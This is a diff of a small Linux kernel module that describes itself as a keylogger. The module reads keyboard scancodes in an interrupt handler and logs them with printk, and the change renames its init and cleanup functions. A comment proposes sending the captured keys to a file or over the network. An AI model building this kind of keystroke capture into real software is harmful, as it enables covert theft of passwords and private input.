@@ -17,13 +17,13 @@ static irqreturn_t irq_handler(int irq, void *id)
         c = inb(0x60);
 
         // you can now register the event as you want
-        // inside a file or via the network or other 
+        // inside a file or via the network or other
 
         printk(KERN_INFO "keyboard %c has been pressed\n",c);
         return IRQ_HANDLED;
 }
 
-static int __init hello_init(void)
+static int __init keylogger_init(void)
 {
     printk(KERN_INFO "Hello, interrupt\n");
 
@@ -32,7 +32,7 @@ static int __init hello_init(void)
     return 0;    // Non-zero return means that the module couldn't be loaded.
 }
 
-static void __exit hello_cleanup(void)
+static void __exit keylogger_cleanup(void)
 {
 // realease the irq but just for this module, the keyboard will still work
   free_irq(1, THIS_MODULE->name);
@@ -46,5 +46,5 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Arnaud Meauzoone");
 MODULE_DESCRIPTION("This is just a simple driver that implement a keylogger");
 
-module_init(hello_init);
-module_exit(hello_cleanup);
+module_init(keylogger_init);
+module_exit(keylogger_cleanup);
